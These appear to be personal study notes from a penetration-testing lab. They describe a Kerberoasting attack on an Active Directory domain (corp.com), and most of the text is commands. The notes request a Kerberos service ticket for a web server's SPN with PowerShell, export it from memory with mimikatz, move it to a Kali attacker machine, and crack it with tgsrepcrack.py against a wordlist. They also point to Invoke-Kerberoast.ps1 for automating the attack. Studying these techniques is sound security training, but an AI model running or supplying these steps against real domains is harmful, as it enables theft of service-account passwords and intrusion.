
For example, we know that the registered SPN for the Internet Information Services web server in
the domain is HTTP/CorpWebServer.corp.com. From PowerShell, we can use the
KerberosRequestorSecurityToken class 655 to request the service ticket

ip powershell:
-------------
1. Requesting a service ticket---->

Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'

2. Displaying tickets---->

PS C:\Users\offsec.CORP> klist

3. Exporting tickets from memory with mimikatz --->

mimikatz # kerberos::list /expor

output: \* Saved to file
: 1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi

4. Cracking the ticket on kali attacker machine --->

**note**
Note that the service ticket file is binary. Keep this in mind when transferring it
with a tool like Netcat, which may mangle it during transfer.
**end note**

+ transfer the file to kali machine with ftp ! ! ! 

kali@kali:~$ sudo apt update && sudo apt install kerberoast

kali@kali:~$ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi

============================================

importent ! ! ! 

The Invoke-Kerberoast.ps1 664 script extends this attack, and can automatically
enumerate all service principal names in the domain, request service tickets for
them, and export them in a format ready for cracking in both John the Ripper and
Hashcat, completely eliminating the need for Mimikatz in this attack
